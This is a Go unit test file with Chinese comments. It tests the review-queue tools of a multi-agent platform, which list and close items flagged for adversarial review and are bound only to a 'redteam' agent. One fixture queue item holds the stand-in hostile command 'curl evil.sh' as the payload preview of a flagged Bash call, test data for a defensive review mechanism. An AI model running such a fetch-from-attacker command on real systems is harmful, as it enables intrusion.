package agent

import (
	"context"
	"encoding/json"
	"errors"
	"reflect"
	"strings"
	"testing"

	"github.com/Autumn-27/artex/db"
	actool "github.com/Autumn-27/norma/tool"
)

// 本文件覆盖「对抗复核队列」这两个 agent 工具（职责分离链的下游：redteam 读队列、
// redteam 结案）。
//
// 三条不变量在这里被钉死：
//  1. 队列不可用时优雅降级（中文错误，不 panic）——工具处理器跑在 harness 自己的
//     goroutine 上，panic 会带走整个进程，且没有任何 recover() 兜得住。
//  2. 结案状态是白名单：模型说什么就写什么 ⇒ 队列状态机就废了。
//  3. 工具只归 redteam，且必须能从 AllDomainTools() 走到——redteam 是 chat 型
//     agent，它的工具全靠 tools 表的绑定注入，够不到就是调不动。

// sodReviewToolKeys 是这两个工具的 key。
var sodReviewToolKeys = []string{"list_adversarial_review_pending", "submit_adversarial_review_result"}

// fakeSodReviewStore 是 SodReviewStoreAPI 的测试替身：记录调用、返回预设结果。
//
// 为什么用假实现而不是连真库：这两个工具的行为边界是【接口契约】——参数怎么解释、
// 白名单怎么校验、错误怎么分类；这些都不依赖 SQL。真库的读写由 db 层自己的测试负责。
type fakeSodReviewStore struct {
	items      []*db.AdversarialReviewItem
	listErr    error
	resolveErr error

	listedTaskID int64
	listedLimit  int
	listCalls    int

	resolveIDs        []int64
	resolveBy         []string
	resolveResolution []string
	resolveStatus     []string
}

// ListPending 实现 SodReviewStoreAPI。
func (f *fakeSodReviewStore) ListPending(taskID int64, limit int) ([]*db.AdversarialReviewItem, error) {
	f.listCalls++
	f.listedTaskID = taskID
	f.listedLimit = limit
	if f.listErr != nil {
		return nil, f.listErr
	}
	return f.items, nil
}

// Resolve 实现 SodReviewStoreAPI。
func (f *fakeSodReviewStore) Resolve(id int64, by, resolution, status string) error {
	f.resolveIDs = append(f.resolveIDs, id)
	f.resolveBy = append(f.resolveBy, by)
	f.resolveResolution = append(f.resolveResolution, resolution)
	f.resolveStatus = append(f.resolveStatus, status)
	return f.resolveErr
}

// withSodReviewStore 装上假的队列访问器，并在测试结束后还原全局变量。
//
// 必须还原：SodReviewStore 是包级变量，不还原会污染同包里的其它测试
// （比如 nil-store 存活测试会突然打到假实现上）。
func withSodReviewStore(t *testing.T, s SodReviewStoreAPI) {
	t.Helper()
	prev := SodReviewStore
	SodReviewStore = s
	t.Cleanup(func() { SodReviewStore = prev })
}

// callSodTool 调用一个工具并返回结果文本。
func callSodTool(t *testing.T, tool actool.CoreTool, in string) actool.Result {
	t.Helper()
	res, err := tool.Call(context.Background(), json.RawMessage(in), nil)
	if err != nil {
		t.Fatalf("工具 %s 返回了传输错误（应是工具级错误）: %v", tool.Name(), err)
	}
	return res
}

// TestSodReviewToolsDegradeWithoutStore 保证队列访问器没注入时两个工具都优雅降级：
// 返回中文错误，不 panic。
//
// 为什么要专门测：这两个工具会被 tools 表绑给 redteam，而 redteam 可能跑在没有任何
// 队列接入的部署里。此时模型点一下就崩 ⇒ 整个进程死（工具 handler 在 harness 自己的
// goroutine 上跑，服务端的 recover() 够不着）。
func TestSodReviewToolsDegradeWithoutStore(t *testing.T) {
	withSodReviewStore(t, nil)

	ts := NewToolSet(nil, "")
	for _, tool := range []actool.CoreTool{ts.listAdversarialReviewPending(), ts.submitAdversarialReviewResult()} {
		res := callSodTool(t, tool, `{}`)
		if !res.IsError {
			t.Errorf("工具 %s 在队列不可用时不该成功", tool.Name())
			continue
		}
		if !strings.Contains(res.Flatten(), "队列") {
			t.Errorf("工具 %s 的降级错误应说明队列不可用，实际：%q", tool.Name(), res.Flatten())
		}
	}
}

// TestListAdversarialReviewPendingReturnsItems 保证读队列把队列项以 JSON 返回。
func TestListAdversarialReviewPendingReturnsItems(t *testing.T) {
	store := &fakeSodReviewStore{items: []*db.AdversarialReviewItem{
		{ID: 7, SourceAgent: "worker", ToolName: "Bash", PayloadPreview: "curl evil.sh", Status: db.SoDReviewPending},
		{ID: 8, SourceAgent: "planner", ToolName: "http_request", Status: db.SoDReviewPending},
	}}
	withSodReviewStore(t, store)

	ts := NewToolSet(nil, "")
	res := callSodTool(t, ts.listAdversarialReviewPending(), `{"task_id":42}`)
	if res.IsError {
		t.Fatalf("读队列不该失败: %s", res.Flatten())
	}
	var out []map[string]any
	if err := json.Unmarshal([]byte(res.Flatten()), &out); err != nil {
		t.Fatalf("队列结果不是合法 JSON: %v（原文 %q）", err, res.Flatten())
	}
	if len(out) != 2 {
		t.Fatalf("队列项数 = %d，want 2", len(out))
	}
	if !strings.Contains(res.Flatten(), "curl evil.sh") {
		t.Errorf("队列结果应含载荷预览，实际：%q", res.Flatten())
	}
	// task_id 原样传给存储层（0 = 全部）。
	if store.listedTaskID != 42 {
		t.Errorf("传给存储层的 task_id = %d，want 42", store.listedTaskID)
	}
}

// TestListAdversarialReviewPendingClampsLimit 保证 limit 被夹在 [1,100]。
//
// 上限的意义是防止模型一次把整个队列拉进上下文（反模式 8：把可执行产物塞进上下文）。
func TestListAdversarialReviewPendingClampsLimit(t *testing.T) {
	ts := NewToolSet(nil, "")
	cases := []struct {
		in   string
		want int
	}{
		{`{}`, 20},
		{`{"limit":0}`, 20},
		{`{"limit":-5}`, 20},
		{`{"limit":5}`, 5},
		{`{"limit":100}`, 100},
		{`{"limit":1000}`, 100},
	}
	for _, c := range cases {
		store := &fakeSodReviewStore{}
		withSodReviewStore(t, store)
		res := callSodTool(t, ts.listAdversarialReviewPending(), c.in)
		if res.IsError {
			t.Fatalf("读队列不该失败: %s", res.Flatten())
		}
		if store.listedLimit != c.want {
			t.Errorf("limit=%s → 传给存储层 %d，want %d", c.in, store.listedLimit, c.want)
		}
	}
}

// TestSubmitAdversarialReviewResultClosesItem 保证结案把参数原样交给存储层，
// 且署名有值。
func TestSubmitAdversarialReviewResultClosesItem(t *testing.T) {
	for _, status := range []string{db.SoDReviewResolved, db.SoDReviewDismissed} {
		store := &fakeSodReviewStore{}
		withSodReviewStore(t, store)

		ts := NewToolSet(nil, "")
		res := callSodTool(t, ts.submitAdversarialReviewResult(),
			`{"id":7,"resolution":"已证伪：属正常业务流量","status":"`+status+`"}`)
		if res.IsError {
			t.Fatalf("结案不该失败: %s", res.Flatten())
		}
		if len(store.resolveIDs) != 1 {
			t.Fatalf("存储层被调用 %d 次，want 1", len(store.resolveIDs))
		}
		if store.resolveIDs[0] != 7 {
			t.Errorf("结案 id = %d，want 7", store.resolveIDs[0])
		}
		if store.resolveStatus[0] != status {
			t.Errorf("结案状态 = %q，want %q", store.resolveStatus[0], status)
		}
		if store.resolveResolution[0] != "已证伪：属正常业务流量" {
			t.Errorf("结案理由 = %q，want 原样透传", store.resolveResolution[0])
		}
		if strings.TrimSpace(store.resolveBy[0]) == "" {
			t.Errorf("结案署名（by）不能为空")
		}
	}
}

// TestSubmitAdversarialReviewResultRejectsInvalidStatus 保证非法状态被拒且
// 【不碰存储层】——非法状态一旦落库，队列的状态机就废了。
func TestSubmitAdversarialReviewResultRejectsInvalidStatus(t *testing.T) {
	for _, bad := range []string{"pending", "claimed", "hacked", "", "RESOLVED"} {
		store := &fakeSodReviewStore{}
		withSodReviewStore(t, store)

		ts := NewToolSet(nil, "")
		res := callSodTool(t, ts.submitAdversarialReviewResult(),
			`{"id":7,"resolution":"x","status":"`+bad+`"}`)
		if !res.IsError {
			t.Errorf("状态 %q 应被拒绝", bad)
			continue
		}
		if len(store.resolveIDs) != 0 {
			t.Errorf("状态 %q 被拒后仍调用了存储层", bad)
		}
		if !strings.Contains(res.Flatten(), db.SoDReviewResolved) ||
			!strings.Contains(res.Flatten(), db.SoDReviewDismissed) {
			t.Errorf("状态 %q 的拒绝信息应列出允许值，实际：%q", bad, res.Flatten())
		}
	}
}

// TestSubmitAdversarialReviewResultRequiresIdentity 保证缺 id / 缺理由被拒。
func TestSubmitAdversarialReviewResultRequiresIdentity(t *testing.T) {
	cases := []string{
		`{"resolution":"x","status":"resolved"}`,
		`{"id":0,"resolution":"x","status":"resolved"}`,
		`{"id":7,"status":"resolved"}`,
		`{"id":7,"resolution":"   ","status":"resolved"}`,
	}
	for _, in := range cases {
		store := &fakeSodReviewStore{}
		withSodReviewStore(t, store)
		ts := NewToolSet(nil, "")
		res := callSodTool(t, ts.submitAdversarialReviewResult(), in)
		if !res.IsError {
			t.Errorf("输入 %s 应被拒绝", in)
		}
		if len(store.resolveIDs) != 0 {
			t.Errorf("输入 %s 被拒后仍调用了存储层", in)
		}
	}
}

// TestSubmitAdversarialReviewResultReportsMissingItem 保证「复核项不存在」有独立的
// 中文说法——模型据此知道该换一条 id，而不是以为自己写错了理由。
func TestSubmitAdversarialReviewResultReportsMissingItem(t *testing.T) {
	store := &fakeSodReviewStore{resolveErr: db.ErrSoDReviewNotFound}
	withSodReviewStore(t, store)

	ts := NewToolSet(nil, "")
	res := callSodTool(t, ts.submitAdversarialReviewResult(), `{"id":999,"resolution":"x","status":"resolved"}`)
	if !res.IsError {
		t.Fatal("不存在的复核项应报错")
	}
	if !strings.Contains(res.Flatten(), "不存在") && !strings.Contains(res.Flatten(), "结案") {
		t.Errorf("缺失项的错误信息应说明项不存在/已结案，实际：%q", res.Flatten())
	}
}

// TestSubmitAdversarialReviewResultReportsStoreError 保证存储层的一般错误也被如实
// 报出来（不是静默成功）。
func TestSubmitAdversarialReviewResultReportsStoreError(t *testing.T) {
	store := &fakeSodReviewStore{resolveErr: errors.New("连接池耗尽")}
	withSodReviewStore(t, store)

	ts := NewToolSet(nil, "")
	res := callSodTool(t, ts.submitAdversarialReviewResult(), `{"id":7,"resolution":"x","status":"resolved"}`)
	if !res.IsError {
		t.Fatal("存储层报错时应返回工具错误")
	}
	if !strings.Contains(res.Flatten(), "连接池耗尽") {
		t.Errorf("错误信息应含底层原因，实际：%q", res.Flatten())
	}
}

// TestSodReviewToolsBoundToRedteamOnly 保证这两个工具【只】绑给 redteam。
//
// 别的 agent 拿到它们要么越权（别的 agent 结案 ⇒ 队列结论不可信），要么是拿到了
// 一个调不动的工具（域注册表里没有）。
func TestSodReviewToolsBoundToRedteamOnly(t *testing.T) {
	byTool := seedAgentsByTool(BuiltinToolSeeds())
	for _, key := range sodReviewToolKeys {
		got, ok := byTool[key]
		if !ok {
			t.Errorf("工具 %s 不在 seed 目录里", key)
			continue
		}
		if !sameAgentSet(got, []string{"redteam"}) {
			t.Errorf("工具 %s 的绑定 = %v，want [redteam]", key, got)
		}
	}
}

// TestSodReviewToolSeedSchemaMatchesTool 保证目录里的 schema 与工具实际的
// InputSchema 一致——两处各写一份必然漂移，而漂移的后果是「模型看到的参数」与
// 「代码里实际读的参数」不是一回事。
func TestSodReviewToolSeedSchemaMatchesTool(t *testing.T) {
	ts := NewToolSet(nil, "")
	actual := map[string]map[string]any{
		"list_adversarial_review_pending":  ts.listAdversarialReviewPending().InputSchema(),
		"submit_adversarial_review_result": ts.submitAdversarialReviewResult().InputSchema(),
	}
	for _, s := range BuiltinToolSeeds() {
		want, ok := actual[s.Key]
		if !ok {
			continue
		}
		if !reflect.DeepEqual(s.Schema, want) {
			t.Errorf("工具 %s 的目录 schema 与实际 schema 不一致：\n目录 %v\n实际 %v", s.Key, s.Schema, want)
		}
	}
}

// TestSodReviewToolsReachableThroughAllDomainTools 保证两个工具能从 AllDomainTools()
// 走到——server 的 buildDomainReg 只认这个集合，够不到 ⇒ redteam 拿不到工具。
//
// redteam 是 chat 型 agent（role=assistant），它没有自己的 ToolSet，全靠 tools 表
// 的绑定 + 域注册表注入。
func TestSodReviewToolsReachableThroughAllDomainTools(t *testing.T) {
	names := map[string]bool{}
	for _, tool := range NewToolSet(nil, "").AllDomainTools() {
		names[tool.Name()] = true
	}
	for _, key := range sodReviewToolKeys {
		if !names[key] {
			t.Errorf("工具 %s 不在 AllDomainTools() 里，redteam 拿不到", key)
		}
	}
}

// TestSodReviewToolsNotInBaseToolSets 保证这两个工具没有混进任何执行 agent 的
// 基础工具集（worker/planner/mainagent/auto/pentest）——它们只归 redteam。
func TestSodReviewToolsNotInBaseToolSets(t *testing.T) {
	ts := NewToolSet(nil, "")
	sets := map[string][]actool.CoreTool{
		"worker":    ts.WorkerTools(),
		"planner":   ts.PlannerTools(),
		"mainagent": ts.MainAgentTools(),
	}
	for label, tools := range sets {
		for _, tool := range tools {
			for _, key := range sodReviewToolKeys {
				if tool.Name() == key {
					t.Errorf("工具 %s 混进了 %s 的基础工具集", key, label)
				}
			}
		}
	}
}

// TestSodReviewToolsAreAdvisoryWrite 保证两个工具都被认作「顾问自己的建议通道」
// 而不是「改写平台共享状态」——redteam 的策略是 DenyWrite=true，认错能力面就会被
// 挡掉（工具绑得上、调不动）。
func TestSodReviewToolsAreAdvisoryWrite(t *testing.T) {
	for _, key := range sodReviewToolKeys {
		if got := db.AdvisoryToolCapability(key, "builtin"); got != db.AdvisoryCapAdvisoryWrite {
			t.Errorf("工具 %s 的能力面 = %v，want AdvisoryCapAdvisoryWrite", key, got)
		}
	}
}

// TestSodReviewToolsAllowedForRedteam 保证两个工具在 db 层策略里对 redteam 是放行的。
func TestSodReviewToolsAllowedForRedteam(t *testing.T) {
	p, ok := db.AdvisoryAgentToolPolicyFor("redteam")
	if !ok {
		t.Fatal("找不到 redteam 的工具绑定策略")
	}
	for _, key := range sodReviewToolKeys {
		if !p.Allows(key, "builtin") {
			t.Errorf("redteam 不该被允许绑定 %s", key)
		}
		if p.Denies(key, "builtin") {
			t.Errorf("redteam 被硬拒绝了 %s", key)
		}
	}
}
